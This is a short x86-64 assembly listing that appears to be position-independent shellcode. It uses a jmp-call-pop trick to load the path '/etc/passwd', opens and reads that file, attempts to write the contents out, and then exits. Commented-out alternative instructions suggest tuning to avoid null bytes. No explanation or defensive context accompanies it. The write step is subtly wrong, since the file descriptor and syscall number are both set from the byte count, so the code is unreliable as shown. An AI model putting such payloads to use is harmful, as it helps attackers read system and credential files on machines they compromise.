_start:
jmp _push_filename
  
_readfile:
pop rdi 
; xor byte [rdi + 11], 0x41
; xor rax, rax
xor rsi, rsi
push rsi
push   0x2	
; add al, 2
pop    rax
; xor rsi, rsi 		
syscall
  
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
;xor rax, rax
mov rax, rdx
mov dx, 0xfff 
syscall
  
xor rdi, rdi
;add dil, 1 
inc rdi
mov rdx, rax
;xor rax, rax
;add al, 1
mov rdi, rax
syscall
  
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwd"
